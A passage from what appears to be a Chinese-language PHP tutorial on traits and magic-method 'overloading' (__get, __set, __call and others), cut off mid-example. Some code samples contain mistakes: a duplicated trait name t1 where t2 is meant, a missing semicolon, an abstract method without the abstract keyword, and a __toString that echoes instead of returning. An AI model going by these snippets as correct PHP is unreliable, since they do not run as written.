class="keyword">private</span> <span class="variable">$info</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showTime</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;time;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">showHow</span>(<span class="params"></span>)</span>&#123;<span class="comment">//允许定义，但是实际不用</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;how;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> PI = <span class="number">3.14</span>;<span class="comment">//错误：trait中不能有常量</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>trait是用来实现代码的复用的，不可以被实例化也不可以被继承（不是类）</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Eat</span></span>&#123;&#125;</span><br><span class="line"><span class="keyword">new</span> Eat();<span class="comment">//错误，没有该类</span></span><br></pre></td></tr></table></figure><ol start="4"><li>trait是用来将公共代码提供给其他类使用的，而类要使用trait的前提是加载对应的trait</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Eat</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;eat&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//类中加载trait</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="comment">//加载：使用use关键字</span></span><br><span class="line">    <span class="keyword">use</span> <span class="title">Eat</span>;<span class="comment">//use就表示将trait Eat中的所有东西拿到了当前类Human中</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用trait中的内容</span></span><br><span class="line"><span class="variable">$h</span> = <span class="keyword">new</span> Human();</span><br><span class="line"><span class="variable">$h</span>-&gt;show();<span class="comment">//eat：Human类自己没有show方法，但是因为使用了trait Eat，所以可用</span></span><br></pre></td></tr></table></figure><ol start="5"><li>一个类可以使用多个trait</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">t1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;eat&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">t1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;sleep&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="comment">//使用多个trait</span></span><br><span class="line">    <span class="keyword">use</span> <span class="title">t1</span>,<span class="title">t2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;eat();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sleep();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$h</span> = <span class="keyword">new</span> Human();</span><br><span class="line"><span class="variable">$h</span>-&gt;show();<span class="comment">//eat sleep</span></span><br></pre></td></tr></table></figure><ol start="6"><li>如果同时引入的多个trait中有同名方法，那么会产生冲突：解决冲突的方法是使用insteadof代替处理以及对被替代方法使用别名</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">t1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;t1,eat&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">t2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;t2,eat&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">t1</span>,<span class="title">t2</span>;<span class="comment">//错误：eat()方法冲突</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//解决方案：明确替代</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">t1</span>,<span class="title">t2</span>&#123;//花括号</span><br><span class="line">        <span class="title">t2</span>::<span class="title">eat</span> <span class="title">insteadof</span> <span class="title">t1</span>; <span class="comment">//t2的eat代替t1的eat</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> Person();</span><br><span class="line"><span class="variable">$p</span>-&gt;eat();<span class="comment">//t2,eat</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//解决方案：先替换后别名</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">t1</span>,<span class="title">t2</span>&#123;</span><br><span class="line">        <span class="title">t1</span>::<span class="title">eat</span> <span class="title">insteadof</span> <span class="title">t2</span>;<span class="comment">//明确使用t1中的eat方法</span></span><br><span class="line">        t2::eat <span class="keyword">as</span> eat2;<span class="comment">//t2中的eat方法改名叫eat2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Animal();</span><br><span class="line"><span class="variable">$a</span>-&gt;eat();<span class="comment">//t1,eat</span></span><br><span class="line"><span class="variable">$a</span>-&gt;eat2();<span class="comment">//t2,eat</span></span><br></pre></td></tr></table></figure><ol start="7"><li>同名覆盖问题：如果类中有与引入的trait同名成员，会有不同处理</li></ol><ul><li>属性：不允许重名，即类中不允许定义与trait中同名的成员属性（静态属性也一样）</li><li>方法：类覆盖trait</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Eat</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$food</span> = <span class="string">&#x27;米饭&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;food;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Eat</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//定义同名属性</span></span><br><span class="line">    <span class="comment">//public $food = &#x27;面条&#x27;;//错误</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//定义方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;show&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$h</span> = <span class="keyword">new</span> Human();</span><br><span class="line"><span class="variable">$h</span>-&gt;show();<span class="comment">//show：类覆盖掉trait</span></span><br></pre></td></tr></table></figure><ol start="8"><li>继承覆盖问题：如果类中在使用trait的同时，也是继承自父类，而trait中与父类中有同名方法，那么trait中将覆盖父类同名方法；如果要访问父类方法，可以在trait同名方法中使用parent关键字访问父类同名方法</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Eat</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Eat::eat&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Human::eat&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//子类继承父类同时使用trait</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span> <span class="keyword">extends</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Eat</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$m</span> = <span class="keyword">new</span> Man();</span><br><span class="line"><span class="variable">$m</span>-&gt;eat();</span><br></pre></td></tr></table></figure><ol start="9"><li>另外，trait自己不能访问，只是用来给其他类提供代码复用的，因此允许类在使用trait时更高里面方法的访问控制权：在as之后，使用目标访问修饰限定符</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Eat</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;eat&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Eat</span>&#123;</span><br><span class="line">        <span class="title">show</span> <span class="title">as</span> <span class="title">public</span> <span class="title">eshow</span>;</span><br><span class="line">        <span class="comment">//注意：as是用来设定别名的，虽然没有同名show，但是系统认为show已经存在，所以必须别名</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$h</span> = <span class="keyword">new</span> Human();</span><br><span class="line"><span class="variable">$h</span>-&gt;eshow();<span class="comment">//eat</span></span><br></pre></td></tr></table></figure><ol start="10"><li>trait中可以使用抽象方法，用来规范使用类必须实现对应抽象方法：使用类要么为抽象类，要么就必须实现抽象方法</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Eat</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>;<span class="comment">//抽象方法</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Human</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Eat</span>;<span class="comment">//抽象类：可以不实现抽象方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Eat</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;<span class="comment">//具体类：实现抽象方法</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Animal::eat&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>总结</strong></p></blockquote><ol><li>trait是一种类似class结构关键字，trait不能被实例化，可以拥有所有类成员结构（类常量不行）</li><li>trait是用来实现代码复用的，为其他类提供公共代码（方法），其他类如果使用trait用use关键字引入</li><li>在类中use具体trait就相当于将trait内的所有代码在类中写了一遍</li><li>一个类可以使用多个trait，但是要注意同名问题</li></ol><ul><li>同名方法可以使用insteadof来实现替代：一个trait中的同名方法替代另外一个，类就访问替代的那个</li><li>同名方法可以在被替代之后使用as制作方法别名：类就可以拥有两个方法</li></ul><ol start="5"><li>类中在引入trait后，要注意与trait中的同名成员问题</li></ol><ul><li>同名属性：不予许（类中不允许）</li><li>同名方法：允许，类中的方法会覆盖trait中的方法</li></ul><ol start="6"><li>如果类在使用trait的同时也继承了其他类，那么trait中出现的同名方法会覆盖基类的同名方法：类自己 &gt; trait &gt; 基类</li><li>类在使用trait时可以修改trait方法的控制级别：更严或者更宽松都可以，注意修改控制级别时使用的是别名机制，一定需要改成别名：[trait名::]方法名 as 访问修饰限定符 别名;（原来trait中的方法依然可以正常使用）</li><li>trait中可以使用抽象方法，那么使用该trait的类就必须本身为抽象类或者将抽象方法实现</li><li>trait使用机制</li></ol><ul><li>有公共代码要实现（方法），而这些方法可能在很多类中会用到</li><li>公共代码不是属于某一类事务特有，而是很多事务都有（不符合继承）</li></ul><hr><blockquote><p><strong>思考</strong>：PHP对象是复合数据类型，如果直接echo输出对象会报错的，这样的报错会给用户体验不好，有没有办法能够解决这类问题呢？</p></blockquote><blockquote><p><strong>引入</strong>：虽然上述问题出现是因为程序员的误操作，但是的确有可能会出现这样的问题，尤其是当我们的程序是给一些外部调用时。所以，面向对象关于很多对象可能出现的错误都提供了一种容错机制，这种机制叫做<code>重载</code></p></blockquote><h3 id="10-PHP重载【了解】"><a href="#10-PHP重载【了解】" class="headerlink" title="10. PHP重载【了解】"></a><strong>10. PHP重载【了解】</strong></h3><blockquote><p><strong>定义</strong>：重载overload，本意指在一个类中可以出现多个同名方法，彼此之间的参数个数和类型不一样。但是PHP中不支持同名方法，而且也不区分数据类型（弱类型语言），所以PHP不支持传统重载。PHP中的重载指的是当某些不允许操作发生时，会自动调用的一种内部机制，即自动调用相关的魔术方法。</p></blockquote><ol><li>魔术方法：指系统为类中预先设计好的，只需要开发者实现的方法，魔术方法以双下划线<code>__</code>开始。对象在某些特定情况下会自动调用的方法。构造方法、析构方法和克隆方法就是魔术方法</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> Man();<span class="comment">//实例化后对象自动调用（触发时机：对象被实例化）</span></span><br></pre></td></tr></table></figure><ol start="2"><li>PHP重载是指某些容错处理（也可以理解为为了某些特殊情况而自动调用），在访问没有权限或者不存在的属性或者方法的时候，会自动触发的魔术方法。</li></ol><ul><li>属性重载</li><li>方法重载</li></ul><ol start="3"><li>属性重载：当PHP对象访问不存在的或者没有权限访问的属性的时候会自动调用的方法</li></ol><ul><li>__get($key)：读属性的时候触发</li><li>__set($key,$value)：写属性的时候触发</li><li>__isset($key)：外部调用isset()函数或者empty()函数时自动触发</li><li>__unset($key)：外部调用unset()结构删除对象属性时自动触发</li><li>__toString()：对象被当做普通变量输出或者连接时自动调用</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span> = <span class="number">10</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//读取重载</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$key</span>,<span class="keyword">__METHOD__</span>,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//写重载</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$key</span> . <span class="string">&#x27; : &#x27;</span> . <span class="variable">$value</span> . <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//查是否存在重载</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$key</span>,<span class="keyword">__METHOD__</span>,<span class="string">&#x27;&lt;br/&gt;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//删除属性重载</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$key</span>,<span class="keyword">__METHOD__</span>,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//对象字符串化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span>,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实例化</span></span><br><span class="line"><span class="variable">$m</span> = <span class="keyword">new</span> Man();</span><br><span class="line"><span class="variable">$m</span>-&gt;age;<span class="comment">//类外访问私有属性：原本不允许</span></span><br><span class="line"><span class="variable">$m</span>-&gt;age = <span class="number">100</span>;<span class="comment">//设置</span></span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$m</span>-&gt;age);<span class="comment">//判定</span></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$m</span>-&gt;age);<span class="comment">//删除</span></span><br></pre></td></tr></table></figure><ol start="4"><li>属性重载的目的：一方面为了不让程序运行出错，另一方面可以在类内部由我们自己控制内容的访问</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span> = <span class="number">10</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//读取重载</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//echo $key,&#x27;&lt;br/&gt;&#x27;;</span></span><br><span class="line">        <span class="comment">//定义一个允许访问列表：假设有很多私有属性</span></span><br><span class="line">        <span class="variable">$allow</span> = <span class="keyword">array</span>(<span class="string">&#x27;age&#x27;</span>);</span><br><span class="line">        <span class="comment">//判定是否在列表内：在就允许访问，不在就返回NULL或者false</span></span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$key</span>,<span class="variable">$allow</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;<span class="variable">$key</span>;<span class="comment">//可变属性：$key是外部访问的目标，最终为$this-&gt;age</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//不允许访问</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//写重载（该方法没有返回值）</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//echo $key . &#x27; : &#x27; . $value . &#x27;&lt;br/&gt;&#x27;;</span></span><br><span class="line">        <span class="comment">//与__get理论类似：允许的设置，不允许的不设置（什么都不做即可）        </span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//判定重载</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//给出内部判定结果</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;<span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//对象重载</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//返回一个指定字符串（一般是当类有属性保存某些信息时，输出某个属性）</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">__METHOD__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>方法重载：当PHP对象访问不存在的方法或者不允许访问的方法时自动调用的方法（抑或是谋者特殊情况，如构造方法）</li></ol><ul><li>__call($function_name[,$args])：对象调用不可调用方法时触发</li><li>__callStatic($function_name[,$args])：类访问不可调用静态方法时触发</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span>,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">staticShow</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span>,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//普通方法重载</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$name</span>,<span class="keyword">__METHOD__</span>,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//静态方法重载</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$name</span>,<span class="keyword">__METHOD__</span>,<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//访问不可访问的方法</span></span><br><span class="line">Man::staticShow();</span><br><span class="line"><span class="variable">$m</span> = <span class="keyword">new</span> Man();</span><br><span class="line"><span 